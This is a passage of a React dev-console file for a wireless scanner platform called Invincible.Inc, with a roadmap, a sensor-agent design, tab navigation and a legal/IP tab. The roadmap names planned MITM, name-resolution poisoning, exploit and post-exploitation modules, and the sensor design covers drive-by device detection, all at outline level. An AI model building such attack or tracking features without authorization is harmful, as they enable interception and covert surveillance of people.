          'Core visualizations: asset inventory, attack surface dashboard, timeline',
        ]},
        { phase:'Medium-Term — Assessment Depth', color:'#FFD60A', items:[
          'Vulnerability scanning: Nessus + OpenVAS/GVM with safe defaults and policy templates',
          'Web testing: Burp/ZAP artifact ingestion + web surface maps + issue normalization (OWASP WSTG)',
          'Identity graph pipeline: CME/Impacket ingestion, BloodHound-style graph views',
          'LLDP/CDP/SNMP topology inference and correlation to scan results',
          'Wireless RF survey module (Kismet API + unified logs)',
        ]},
        { phase:'Advanced — Intrusive Validation & Cloud-Native', color:'#FF453A', items:[
          'Controlled MITM validation with hard gating, maintenance windows, and auto-timeout',
          'Name-resolution poisoning simulations with explicit arming and teardown',
          'Exploit validation harness with safe-target allowlists (stops at proof-of-control)',
          'Post-exploitation triage — highest-sensitivity tier, client-side witness required',
          'Cloud expansion: Prowler/ScoutSuite ingestion, Trivy/kube-bench, kube-hunter (owned clusters)',
        ]},
      ].map(section => (
        <div key={section.phase} style={{ ...S.card, borderLeft:`3px solid ${section.color}`, paddingLeft:12 }}>
          <div style={{ fontSize:12, fontWeight:700, color:section.color, marginBottom:8 }}>{section.phase}</div>
          {section.items.map(item => (
            <div key={item} style={{ display:'flex', gap:8, fontSize:11, color:C.dim, padding:'3px 0', borderBottom:`1px solid rgba(255,255,255,0.04)` }}>
              <span style={{ color:section.color, flexShrink:0 }}>▸</span>{item}
            </div>
          ))}
        </div>
      ))}

      <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', fontSize:11, color:C.dim2, lineHeight:1.8 }}>
        <strong style={{ color:C.dim }}>Status:</strong> Invincible.Net is in pre-development planning. This tab serves as the internal specification and advertising reference. All tool integrations require explicit customer authorization and ROE documentation before use in any engagement.
      </div>

      {/* Cooperative Scanning Architecture */}
      <div style={S.label}>Cooperative Scanning — Sensor Agent Model</div>
      <div style={{ ...S.card, background:'rgba(0,200,255,0.03)', padding:'14px 16px' }}>
        <div style={{ fontSize:12, fontWeight:700, color:C.accent, marginBottom:8 }}>Controller + Agent Architecture</div>
        <div style={{ fontSize:11, color:C.dim, lineHeight:1.7, marginBottom:12 }}>
          The Windows controller defines scope (allowlists, time window, engagement ID), collects and merges sensor data from nearby agent devices, builds encounters/heatmap/clusters, and generates reports. Agent devices (phones, spare laptops, Raspberry Pi nodes, USB dongle rigs) perform limited local scanning and send summaries to the controller.
        </div>
        {[
          { icon:'📡', title:'Wi-Fi Sensor Agents', desc:'Multiple agents with different antenna placement (passenger window, rear window) provide better coverage. Channel splitting: agent A watches 2.4 GHz ch 1/6/11; agent B watches 5 GHz 36/40/44/48. Fast scan cadence for highway-speed detection.' },
          { icon:'🔵', title:'BLE Sensor Agents', desc:'Android phones are good BLE scanners. Multiple agents reduce RSSI noise from vehicle body reflections. iOS: BLE + GPS + notes only (Wi-Fi scanning restricted by platform).' },
          { icon:'📶', title:'Cellular Context', desc:'Cell ID, network type, and signal bars from OS APIs are safe legal telemetry. No RF interception. Cellular "carrier testing mode" risks are documented in ref-radio-sdr-pipeline.' },
          { icon:'🔒', title:'Trust Model', desc:'QR-code pairing + mutual TLS (per-engagement certs). Scope token embedded: allowed target IDs, bands, time window. Agents only scan approved targets — hard allowlist enforced before any capture.' },
        ].map(item => (
          <div key={item.title} style={{ display:'flex', gap:10, padding:'8px 0', borderTop:`1px solid ${C.border}` }}>
            <span style={{ fontSize:16, flexShrink:0 }}>{item.icon}</span>
            <div>
              <div style={{ fontSize:11, fontWeight:700, color:C.text, marginBottom:3 }}>{item.title}</div>
              <div style={{ fontSize:10, color:C.dim, lineHeight:1.6 }}>{item.desc}</div>
            </div>
          </div>
        ))}
      </div>

      {/* Distributed Sensor Tiers */}
      <div style={S.label}>Coverage Expansion — Sensor Tiers (Widest → Nearest)</div>
      {[
        { rank:'1', title:'Opt-In Crowdsourced Fleet (City Scale)', color:C.accent, desc:'Many volunteer/authorized devices upload tagged local scans to a shared server. Coverage scales with participant count and distribution. Must be fully opt-in or explicitly authorized corporate devices. Best for large-area mapping and trend detection.' },
        { rank:'2', title:'Authorized Infrastructure as Sensors (Campus Scale)', color:C.green, desc:'In permitted environments, managed Wi-Fi APs and wireless controllers already see all clients across a building or campus. Treat them as distributed sensors for instant multi-floor coverage. Best for enterprise assessments.' },
        { rank:'3', title:'Coordinated Multi-Scanner Cluster (Block Scale)', color:'#FFD60A', desc:'Several nearby devices split Wi-Fi channels and BLE scan windows to avoid redundancy. One device handles discovery, another handles follow-up metadata. Critical for highway-speed drive-by detection where you have only seconds in range.' },
        { rank:'4', title:'Local Ad-Hoc Mesh (Room/Vehicle Scale)', color:C.orange, desc:'Devices within ~30m form a BLE mesh or Wi-Fi Direct cluster. Each node scans its immediate area and shares summaries to the lead controller. Best for multi-floor buildings or a car + nearby devices.' },
        { rank:'5', title:'Relay-Only Nearby Devices (Same Location)', color:C.dim, desc:'Nearby devices relay results or provide compute/storage — no additional RF coverage. Improves reliability and reduces dropped data but does not expand the scan footprint.' },
      ].map(tier => (
        <div key={tier.rank} style={{ ...S.card, display:'flex', gap:12, alignItems:'flex-start', padding:'10px 14px', marginBottom:6 }}>
          <div style={{ width:24, height:24, borderRadius:'50%', background:`${tier.color}22`, border:`2px solid ${tier.color}`, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:11, fontWeight:800, color:tier.color }}>{tier.rank}</div>
          <div>
            <div style={{ fontSize:11, fontWeight:700, color:tier.color, marginBottom:4 }}>{tier.title}</div>
            <div style={{ fontSize:10, color:C.dim, lineHeight:1.6 }}>{tier.desc}</div>
          </div>
        </div>
      ))}

      {/* Unified Release History */}
      <div style={S.label}>Release History</div>
      {DEV_CHANGELOG.map((entry, i) => (
        <div key={i} style={{ ...S.card, marginBottom:8, opacity: entry.devOnly ? 0.75 : 1 }}>
          <div style={{ display:'flex', alignItems:'center', gap:10 }}>
            <span style={{ fontSize:16 }}>{entry.devOnly ? '🔧' : '📦'}</span>
            <div style={{ flex:1 }}>
              <div style={{ display:'flex', alignItems:'center', gap:8, flexWrap:'wrap' }}>
                <span style={{ fontSize:13, fontWeight:800, color:C.text }}>{entry.version}</span>
                <span style={{ fontSize:10, color:C.dim }}>— {entry.date}</span>
                {entry.devOnly && <span style={{ fontSize:9, background:'rgba(255,69,58,0.1)', color:'#FF453A', padding:'1px 6px', borderRadius:20, border:'1px solid rgba(255,69,58,0.2)' }}>DEV ONLY</span>}
              </div>
              <div style={{ fontSize:12, color: entry.devOnly ? C.dim : C.accent, marginTop:2 }}>{entry.title}</div>
            </div>
          </div>
          <ul style={{ margin:'8px 0 0 22px', padding:0, listStyle:'disc' }}>
            {entry.items.map((item, j) => (
              <li key={j} style={{ fontSize:11, color:C.dim, lineHeight:1.7, marginBottom:1 }}>{item}</li>
            ))}
          </ul>
          <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginTop:8 }}>
            {entry.platforms.map(p => (
              <span key={p} style={{ fontSize:10, padding:'2px 8px', borderRadius:20, background:'rgba(0,200,255,0.07)', border:'1px solid rgba(0,200,255,0.15)', color:C.dim2 }}>{p}</span>
            ))}
          </div>
        </div>
      ))}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Main dev interface
// ─────────────────────────────────────────────────────────────────────────────
const TABS = ['Map','Dashboard','Scanner','Registry','Users','Devices','Data','Signal','Replay','Settings','Targets','Security','Lab','Toolkit','.Net','Achievements','Docs','Legal']

function DevInterface() {
  const [tab, setTab] = useState('Dashboard')
  const [data, setData] = useState({
    status:null, gps:null, users:[], registeredUsers:[], encounters:[],
    heatCells:[], routePoints:[], settings:null, health:{},
    gpsHistory:[], signalBuckets:[],
  })
  const gpsHistRef = useRef([])

  const refresh = useCallback(async () => {
    const reqs = [
      ['/control/status',       'status'],
      ['/gps/status',           'gps'],
      ['/users',                'users'],
      ['/encounters?limit=200', 'encounters'],
      ['/heatmap',              'heatCells'],
      ['/route?limit=500',      'routePoints'],
      ['/settings',             'settings'],
      ['/scan/timeline',        'signal'],
      ['/users/registry',       'registry'],
    ]
    const healthMap = {}
    const results = await Promise.all(reqs.map(([ep]) =>
      fetch(ep).then(r => { healthMap[ep.split('?')[0]] = r.status; return r.json() }).catch(() => { healthMap[ep.split('?')[0]] = 'ERR'; return null })
    ))

    // Rolling GPS accuracy buffer (last 60 samples)
    const gpsData = results[1]
    if (gpsData?.accuracy != null) {
      gpsHistRef.current = [...gpsHistRef.current.slice(-59), { acc: gpsData.accuracy, ts: Date.now() }]
    }

    setData({
      status:          results[0] || {},
      gps:             results[1] || {},
      users:           results[2]?.users      || [],
      encounters:      results[3]?.encounters || [],
      heatCells:       results[4]?.cells      || [],
      routePoints:     results[5]?.points     || [],
      settings:        results[6]             || {},
      signalBuckets:   results[7]?.buckets    || [],
      registeredUsers: results[8]?.users      || [],
      health:          healthMap,
      gpsHistory:      gpsHistRef.current,
    })
  }, [])

  const _isMob = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
  useEffect(() => { refresh() }, [refresh])
  useEffect(() => { const id = setInterval(refresh, _isMob ? 12000 : 5000); return () => clearInterval(id) }, [refresh])

  return (
    <div style={{ position:'fixed', inset:0, background:C.bg, color:C.text, fontFamily:C.font, display:'flex', flexDirection:'column', overflow:'hidden',
      backgroundImage:'linear-gradient(rgba(0,200,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.025) 1px,transparent 1px)',
      backgroundSize:'50px 50px' }}>
      <UpdateToast />
      {/* Header */}
      <div style={{ background:'rgba(13,19,34,0.95)', backdropFilter:'blur(20px)', borderBottom:`1px solid ${C.border}`,
        paddingTop:'max(13px, calc(env(safe-area-inset-top, 0px) + 8px))', paddingBottom:'13px', paddingLeft:'18px', paddingRight:'18px',
        display:'flex', alignItems:'center', justifyContent:'space-between', flexShrink:0 }}>
        <div style={{ display:'flex', alignItems:'center', gap:10 }}>
          <span style={{ fontSize:17, fontWeight:800, ...S.gradText(C.gradA) }}>INVINCIBLE.INC</span>
          <span style={{ background:'rgba(255,159,10,0.15)', border:'1px solid rgba(255,159,10,0.3)', color:C.orange, fontSize:10, fontWeight:700, padding:'2px 8px', borderRadius:20, letterSpacing:1 }}>DEV CONSOLE</span>
        </div>
        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
          {data.status?.running
            ? <span style={{ display:'flex', alignItems:'center', gap:5, fontSize:11, color:C.green }}><span className="live-dot" />SCANNING</span>
            : <span style={{ fontSize:11, color:C.dim }}>○ IDLE</span>
          }
          <button style={{ ...S.btn(C.dim), padding:'5px 10px', fontSize:12 }} onClick={refresh}>↻</button>
          <a href="/" style={{ ...S.btn(C.accent), padding:'5px 12px', fontSize:12, textDecoration:'none' }}>← App</a>
        </div>
      </div>

      {/* Tab bar */}
      <div style={{ background:'rgba(13,19,34,0.9)', borderBottom:`1px solid ${C.border}`, display:'flex', overflowX:'auto', flexShrink:0, scrollbarWidth:'none' }}>
        {TABS.map(t => (
          <button key={t} onClick={() => setTab(t)} style={{
            background:'none', border:'none', cursor:'pointer', fontFamily:C.font,
            fontSize:12, fontWeight: tab===t ? 700 : 400,
            color: tab===t ? C.accent : C.dim,
            padding:'10px 14px', whiteSpace:'nowrap',
            borderBottom: tab===t ? `2px solid ${C.accent}` : '2px solid transparent',
            transition:'color 0.15s',
          }}>{t}</button>
        ))}
      </div>

      {/* Body */}
      {(tab === 'Map' || tab === 'Lab') ? (
        <div style={{ flex:1, overflow:'hidden', position:'relative', minHeight:0 }}>
          {tab === 'Map' && <TabMap data={data} />}
          {tab === 'Lab' && <TabLab />}
        </div>
      ) : (
        <div style={{ flex:1, overflowY:'auto', padding:'16px 18px', display:'flex', flexDirection:'column', gap:14 }}>
          {tab === 'Dashboard' && <TabDashboard data={data} />}
          {tab === 'Scanner'   && <TabScanner   data={data} refresh={refresh} />}
          {tab === 'Registry'  && <TabRegistry />}
          {tab === 'Users'     && <TabUsers     data={data} refresh={refresh} />}
          {tab === 'Data'      && <TabData      data={data} refresh={refresh} />}
          {tab === 'Signal'    && <TabSignal    data={data} />}
          {tab === 'Replay'    && <TabReplay />}
          {tab === 'Devices'   && <TabDevices   encounters={data.encounters} />}
          {tab === 'Settings'  && <TabSettings  data={data} refresh={refresh} />}
          {tab === 'Targets'   && <TabTargets />}
          {tab === 'Security'     && <TabSecurity />}
          {tab === 'Toolkit'      && <TabToolkit />}
          {tab === '.Net'         && <TabNetLab />}
          {tab === 'Achievements' && <TabAchievements />}
          {tab === 'Docs'         && <TabDocs />}
          {tab === 'Legal'        && <TabLegal />}
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Legal tab
// ─────────────────────────────────────────────────────────────────────────────
const YEAR = new Date().getFullYear()
function TabLegal() {
  const [open, setOpen] = useState('copyright')
  const sections = [
    { id:'copyright', icon:'©', title:'Copyright Notice', body: (
      <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
        <div style={{ ...S.card, background:'linear-gradient(135deg,rgba(0,200,255,0.06),rgba(124,58,237,0.06))', borderColor:'rgba(0,200,255,0.18)' }}>
          <div style={{ fontSize:16, fontWeight:800, color:C.text, marginBottom:4 }}>© {YEAR} Invincible.Inc. All Rights Reserved.</div>
          <div style={{ fontSize:12, color:C.dim }}>Scanner Map Platform · Proprietary Software · Unauthorized use prohibited</div>
        </div>
        <div style={S.card}>
          <div style={{ fontSize:12, color:C.dim, lineHeight:1.8 }}>
            All source code, designs, algorithms, database schemas, API structures, UI layouts, and documentation are original works protected by copyright law under <strong style={{ color:C.text }}>17 U.S.C. § 101 et seq.</strong> and the <strong style={{ color:C.text }}>Berne Convention</strong>. Copyright protection attaches automatically at creation — no registration required, but registration at copyright.gov provides statutory damages up to $150,000/infringement and attorney's fees.
          </div>
        </div>
        <div style={{ ...S.card, background:'rgba(255,69,58,0.04)', borderColor:'rgba(255,69,58,0.2)' }}>
          <div style={{ fontSize:11, fontWeight:700, color:C.red, marginBottom:4 }}>PROHIBITED WITHOUT WRITTEN PERMISSION</div>
          <div style={{ fontSize:12, color:C.dim }}>Copying · Redistribution · Reverse engineering · Derivative works · Commercial use</div>
        </div>
      </div>
    )},
    { id:'registration', icon:'📋', title:'Register Your Copyright', body: (
      <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
        <div style={{ ...S.card, background:'rgba(48,209,88,0.04)', borderColor:'rgba(48,209,88,0.15)' }}>
          <div style={{ fontSize:11, fontWeight:700, color:C.green, marginBottom:6 }}>HOW TO FILE AT COPYRIGHT.GOV</div>
          {[
            ['1','Go to copyright.gov → eCO system','Fastest and cheapest — Electronic Copyright Office. Create an account at copyright.gov/registration.'],
            ['2','Choose "Computer Program"','Under Literary Works → Computer Program. Covers all source code, scripts, and executables.'],
            ['3','Enter title + author','Title: "Invincible.Inc Scanner Platform". Author: your legal name or company. Year of creation.'],
            ['4','Upload deposit copy','First 25 + last 25 pages of source code. You may redact trade secrets — this is legally allowed.'],
            ['5','Pay the fee','$45 (single-author online) or $65 (standard). Protection is retroactive to filing date.'],
            ['6','Register each major version','Each release with significant new authorship can be registered as a revised work.'],
          ].map(([n,t,d]) => (
            <div key={n} style={{ display:'flex', gap:10, padding:'6px 0', borderBottom:`1px solid ${C.border}` }}>
              <div style={{ width:20, height:20, borderRadius:'50%', background:'rgba(48,209,88,0.15)', border:'1px solid rgba(48,209,88,0.3)', color:C.green, fontSize:10, fontWeight:800, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, marginTop:1 }}>{n}</div>
              <div><div style={{ fontSize:12, fontWeight:700, color:C.text }}>{t}</div><div style={{ fontSize:11, color:C.dim, marginTop:2 }}>{d}</div></div>
            </div>
          ))}
        </div>
      </div>
    )},
    { id:'trademark', icon:'™', title:'Trademark Registration', body: (
      <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
        <div style={{ ...S.card }}>
          <div style={{ fontSize:12, color:C.dim, lineHeight:1.8, marginBottom:10 }}>The <strong style={{ color:C.text }}>Invincible.Inc</strong> name and logo may be registered through the <strong style={{ color:C.text }}>USPTO</strong>. Trademark protects brand identity; copyright protects creative expression. You can use ™ immediately upon commercial use. ® requires federal registration.</div>
          {[
            ['Search first','Run TESS at tmsearch.uspto.gov to check for conflicts before filing.'],
            ['File under Class 42','International Class 42 = Software as a Service / computer programming. Optionally Class 9 for downloadable apps.'],
            ['TEAS Plus — $250/class','File at uspto.gov. Processing: 8–12 months. Renewal: years 5–6 and 9–10, then every 10 years.'],
          ].map(([t,d]) => (
            <div key={t} style={{ padding:'8px 0', borderBottom:`1px solid ${C.border}` }}>
              <div style={{ fontSize:12, fontWeight:700, color:C.purple, marginBottom:2 }}>{t}</div>
              <div style={{ fontSize:11, color:C.dim }}>{d}</div>
            </div>
          ))}
        </div>
      </div>
    )},
    { id:'secrets', icon:'🔒', title:'Trade Secrets', body: (
      <div style={S.card}>
        <div style={{ fontSize:12, color:C.dim, lineHeight:1.8, marginBottom:10 }}>Protected under <strong style={{ color:C.text }}>18 U.S.C. § 1836 (DTSA)</strong> indefinitely as long as you maintain confidentiality. Implement NDAs with contributors, restrict access, document your protection measures.</div>
        <div style={{ fontSize:11, fontWeight:700, color:C.dim2, textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:6 }}>Items that qualify</div>
        {['Scanning algorithms and detection heuristics','Behavioral fingerprinting logic for device classification','Threat scoring formulas','Unreleased features and roadmap','Internal API key structures'].map(i => (
          <div key={i} style={{ display:'flex', gap:6, marginBottom:4 }}><span style={{ color:C.orange }}>▸</span><span style={{ fontSize:11, color:C.dim }}>{i}</span></div>
        ))}
      </div>
    )},
    { id:'license', icon:'⚖️', title:'Open Source License Options', body: (
      <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
        {[
          ['All Rights Reserved','Current status — maximum protection. No use without written permission.','rgba(255,69,58,0.1)','rgba(255,69,58,0.2)',C.red],
          ['BSL 1.1 (Business Source License)','Source available, not open-source until a specified date. Commercial use requires a license from you. Used by MariaDB, HashiCorp.','rgba(255,159,10,0.06)','rgba(255,159,10,0.2)',C.orange],
          ['AGPL v3','GPL + SaaS loophole closed. Anyone running a modified version publicly must release their changes. Best if you want derivative works to stay open.','rgba(0,200,255,0.04)','rgba(0,200,255,0.15)',C.accent],
        ].map(([n,d,bg,br,col]) => (
          <div key={n} style={{ ...S.card, background:bg, borderColor:br }}>
            <div style={{ fontSize:12, fontWeight:700, color:col, marginBottom:4 }}>{n}</div>
            <div style={{ fontSize:11, color:C.dim }}>{d}</div>
          </div>
        ))}
      </div>
    )},
  ]
  return (
    <div style={S.section}>
      <div style={{ ...S.label }}>© Legal &amp; IP Protection</div>
      {sections.map(sec => (
        <div key={sec.id} style={{ ...S.card, padding:0, overflow:'hidden' }}>
          <button onClick={() => setOpen(open === sec.id ? null : sec.id)} style={{ width:'100%', display:'flex', alignItems:'center', gap:10, padding:'12px 14px', background:'none', border:'none', color:C.text, cursor:'pointer', textAlign:'left', fontFamily:C.font }}>
            <span style={{ fontSize:16, flexShrink:0 }}>{sec.icon}</span>
            <span style={{ flex:1, fontSize:13, fontWeight:700 }}>{sec.title}</span>
            <span style={{ fontSize:10, color:C.dim2, transform: open === sec.id ? 'rotate(90deg)' : 'none', transition:'transform 0.2s' }}>▶</span>
          </button>
          {open === sec.id && (
            <div style={{ padding:'0 14px 14px', borderTop:`1px solid ${C.border}`, paddingTop:12 }}>{sec.body}</div>
          )}
        </div>
      ))}
      <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', fontSize:11, color:C.dim2, lineHeight:1.8 }}>
        <strong style={{ color:C.dim }}>Disclaimer:</strong> This tab provides informational guidance only, not legal advice. Consult a licensed IP attorney for your specific situation.
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────────────────
export default function DevPanel() {
  const [unlocked, setUnlocked] = useState(() => sessionStorage.getItem(SESSION_KEY) === '1')
  if (!unlocked) return <Passcode onUnlock={() => setUnlocked(true)} />
  return <DevInterface />
}
